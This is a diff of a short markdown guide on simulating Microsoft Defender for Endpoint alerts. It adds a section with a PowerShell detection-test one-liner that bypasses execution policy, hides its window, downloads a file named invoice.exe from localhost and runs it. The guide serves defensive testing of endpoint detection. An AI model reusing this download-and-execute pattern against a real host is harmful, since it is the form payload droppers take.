@@ -1,6 +1,6 @@
 # Simulate MDE alerts and incidents
 
-## Multi-stage incident involving Defense evasion & Discovery on one endpoint
+## 1. Multi-stage incident involving Defense evasion & Discovery on one endpoint
 
 ### Download `MTP_Fileless_Recon.txt` to `C:\Temp\MTP_Fileless_Recon.txt` from url below
 ```
@@ -42,3 +42,11 @@ Alerts <br>
 
 Incidents <br>
 <img width="2142" alt="image" src="https://github.com/guguji666666/GJS-MDE/assets/96930989/d9af45ce-b65d-4ac0-a411-f750ed22d03f">
+
+## 2. EDR alert 
+
+[Generate EDR alert](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/run-detection-test?view=o365-worldwide#verify-microsoft-defender-for-endpoint-onboarding-of-a-device-using-a-powershell-detection-test)
+
+```cmd
+powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
+```
